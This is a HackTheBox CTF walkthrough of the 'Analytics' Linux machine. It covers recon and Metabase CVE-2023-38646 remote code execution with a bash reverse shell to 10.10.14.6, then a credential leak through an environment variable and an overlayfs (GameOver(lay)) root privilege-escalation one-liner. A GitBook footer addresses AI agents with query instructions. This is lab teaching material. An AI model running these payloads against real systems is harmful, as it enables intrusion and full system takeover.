---
title: "Analytics"
difficulty: Easy
os: Linux
points: 20
rating: 4.1
date: 2023-10-07
avatar: assets/htb/analytics.png
tags: [Remote Code Execution, Clear Text Credentials, Information Disclosure, Insecure Design, Reconnaissance, Configuration Analysis, Password Reuse, Kernel Exploitation]
htb_url: https://app.hackthebox.com/machines/Analytics
---
# Analytics

🔗 [Analytics](https://www.hackthebox.com/machines/analytics)

### Task 1 - Deploy the machine

🎯 Target IP: `<YOUR_IP>`

On the Desktop, set up a folder named after the machine, and within it nest a second folder to hold all the materials and outputs the box requires, such as the nmap scan results.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "<YOUR_IP> analytics.htb" >> /etc/hosts
</strong>
mkdir -p htb/analytics.htb
cd htb/analytics.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

My usual first move in recon is to ping the target, which confirms it's reachable and gives a hint about the OS.

```bash
ping -c 3 analytics.htb
PING analytics.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from analytics.htb (<YOUR_IP>): icmp_seq=1 ttl=63 time=64.4 ms
64 bytes from analytics.htb (<YOUR_IP>): icmp_seq=2 ttl=63 time=67.6 ms
64 bytes from analytics.htb (<YOUR_IP>): icmp_seq=3 ttl=63 time=59.7 ms
```

After three ICMP replies, the Time To Live (TTL) sits near 64, which points to a \*nix host; Windows machines typically report a TTL closer to 128.

### 2.1 - How many open TCP ports are listening on Analytics?

```bash
nmap -p0- -sS -Pn -vvv analytics.htb -oN nmap/tcp_port_scan
```

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sS</td><td>SynScan</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

The scan shows 2 TCP ports open on the host: 22 and 80.

2

### 2.2 - What subdomain is configured to provide a different application on the target web server?

Next, we run a tighter scan with the -sCV flags to grab service versions and run the common scripts.

```bash
nmap -p22,80 -sS -Pn -n -v -sCV -T4 analytics.htb -oG nmap/port_scan
```

```
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  tcpwrapped
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

With no SSH credentials in hand, we'll start with port 80.

#### Port 80

The http-title reveals a new subdomain, <http://analytical.htb/>, and hitting the HTTP port we get redirected (status code 302) over to analytical.htb.

We can confirm it using a web proxy such as Burp Suite:

To resolve this, we add the domain to our /etc/hosts file

The goal here is to find another subdomain serving a different application on the web server; we located it by inspecting the page's source code:

This URL refers to login page, and to resolve it we need to add it to /etc/hosts

data.analytical.htb

### 2.3 - What application is running on data.analytical.htb?

Whether we run WhatWeb or just look at the page, it's clear a Metabase web application is running.

```bash
whatweb http://data.analytical.htb/
http://data.analytical.htb/ [200 OK] Cookiesetabase.DEVICE], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnlyetabase.DEVICE], IP[<YOUR_IP>], Script[application/json], Strict-Transport-Securityax-age=31536000], Title[Metabase], UncommonHeaders[x-permitted-cross-domain-policies,x-content-type-options,content-security-policy], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

Metabase

### 2.4 -  What version of Metabase is the target running?

Both WhatWeb and an nmap scan can surface the Metabase version, but the quickest route is reading the page's source code.

v0.46.6

### 2.5 - What is the 2023 CVE ID assigned to the pre-authentication, remote code execution vulnerability in this version of Metabase?

A quick search turns up the CVE ID tied to Metabase v0.46.6

CVE-2023-38646

### 2.6 - What is the value of the `setup-token` used by this Metabase instance?

Applying the same approach as task 2.4, the setup-token is visible in the source code

249fa03d-fd94-4d5b-b94f-b4ebf3df681f

### 2.7 - Which Metabase API endpoint is used to execute arbitrary commands using the token?

We find it by reading the writeup from the team that uncovered this vulnerability

/api/setup/validate

### 2.8 -  Which user is the Metabase application running as?

\
Answering this one means exploiting the vulnerability with a python script from github together with the web app parameters

Github repo suggests following usage:

The script needs the **target URL**, the **setup token** and a **command** that will be executed. The setup token can be obtained through the `/api/session/properties` endpoint. Copy the value of the `setup-token` key.

The **command** will be executed on the target machine with the intention of obtaining a **reverse shell**. You can find different options in [RevShells](https://revshells.com/). Having the **setup-token** value and the **command** that will be executed, you can run the script with the following command:

`python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]"`

Now we set up a netcat listener on port 1339 on the attacker box

```
nc -nvlp 1339
```

we save exploit locally and run following command

```
python3 exploit.py -t "249fa03d-fd94-4d5b-b94f-b4ebf3df681f" -u "http://data.analytical.htb" -c "bash -i >& /dev/tcp/10.10.14.6/1339 0>&1"
```

and we're in

metabase

### 2.9 -  Which environment variable contains the password for the metalytics user?

This question hands us a useful clue about our next step.

In fact, running export to list the environment variables reveals credentials

META\_PASS

### Task 3 - Find user flag

### 3.1 - Submit the flag located in the metalytics user's home directory.

Running `sudo -l` shows we have no sudo rights. Still, since port 22 (SSH) was open, we can try logging in there with the credentials we just recovered.

`ssh metalytics@analytics.htb`

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

5d03************************97b9

</details>

### 3.2 - What kernel version is installed on the host system?

The `uname -a` command prints the kernel version

6.2.0-25-generic

### 3.3 - What Ubuntu release is the system running?

We can use `lsb_release -a` or `cat /etc/os-release`<br>

UBUNTU 22.04.03 LTS (JAMMY)

### 3.4 - What component used by the Ubuntu operating system on the target system is vulnerable to a privileges escalation vulnerability assigned two 2023 CVEs?

Given the dated kernel version, a quick Google search leads to a public exploit.

overlayfs

### Task 4 - Find root flag

### 4.1 - Submit the flag located in the root user's home directory.

Following the github explanation below, we can carry out the GameOver(lay) Ubuntu Privilege Escalation

Running the bash script then gives us root, so the root flag is now within reach.

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

2ec3************************a477

</details>

---

# Agent Instructions
This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.

## Querying This Documentation
If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.

Perform an HTTP GET request on the current page URL with the `ask` query parameter:

```
GET https://dev-angelist.gitbook.io/writeups-and-walkthroughs/hackthebox/analytics.md?ask=<question>
```

The question should be specific, self-contained, and written in natural language.
The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.

Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
